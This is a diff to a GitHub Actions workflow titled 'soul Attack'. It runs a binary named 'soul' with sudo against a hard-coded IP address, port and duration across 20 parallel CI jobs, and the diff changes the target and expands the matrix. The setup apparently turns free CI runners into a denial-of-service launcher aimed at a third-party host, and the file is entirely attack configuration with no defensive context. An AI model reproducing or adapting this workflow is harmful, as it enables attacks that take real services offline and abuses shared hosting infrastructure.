@@ -1,14 +1,17 @@
 name: soul Attack
-on: [push]
+On: [push]
 
 jobs:
   soul:
     runs-on: ubuntu-22.04
     strategy:
+      max-parallel: 5      # This enforces the "batch" size of 5 running at once
       matrix:
-        n: [1,2,3,4,5,6,7,8,9,10,
-            11,12,13,14,15]
+        # Expanded to 20 items to create 4 total batches (4 * 5 = 20)
+        n: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
+            11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     steps:
     - uses: actions/checkout@v3
     - run: chmod +x soul
-    - run: sudo ./soul 4.213.68.37 28774 60
+    - run: sudo ./soul 4.213.64.222 26005 1
+    
